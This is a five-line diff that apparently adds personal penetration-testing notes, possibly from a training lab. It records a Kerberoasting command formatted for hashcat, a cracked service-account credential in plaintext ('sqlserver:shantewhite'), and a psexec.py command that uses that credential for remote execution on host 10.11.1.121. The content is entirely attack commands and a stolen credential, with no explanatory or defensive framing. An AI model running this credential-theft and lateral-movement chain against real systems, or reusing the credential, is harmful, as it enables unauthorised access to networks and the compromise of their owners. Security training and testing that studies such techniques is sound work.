@@ -1,0 +1,5 @@
+XORAPP-59: Invoke-Kerberoast -OutputFormat hashcat
+
+XOR-APP23: sqlserver:shantewhite 
+
+psexec.py sqlserver:shantewhite@10.11.1.121
